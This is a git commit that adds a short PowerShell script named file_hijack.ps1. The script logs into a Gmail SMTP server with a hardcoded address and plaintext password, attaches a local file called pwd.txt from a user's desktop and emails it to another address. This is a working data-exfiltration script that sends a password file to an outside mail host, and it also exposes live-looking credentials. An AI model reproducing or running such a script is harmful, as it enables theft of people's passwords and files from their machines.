e65bc6e0573dd0a191a8fec0c6933993d4a25f08
Subhranshu Choudhury <63858190+subhranshuchoudhury@users.noreply.github.com>
2022-01-07 01:30:53 +0530

    Create file_hijack.ps1

---
+++ file_hijack.ps1
@@ -0,0 +1,8 @@
+$Message = new-object Net.Mail.MailMessage 
+$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
+$smtp.Credentials = New-Object System.Net.NetworkCredential("testsubhranshu00@gmail.com", "qwerty@1234"); 
+$smtp.EnableSsl = $true   
+$Message.From = "testsubhranshu00@gmail.com" 
+$Message.To.Add("subhransuchoudhury00@gmail.com") 
+$Message.Attachments.Add("C:\Users\Choud\Desktop\pwd.txt")
+$smtp.Send($Message)
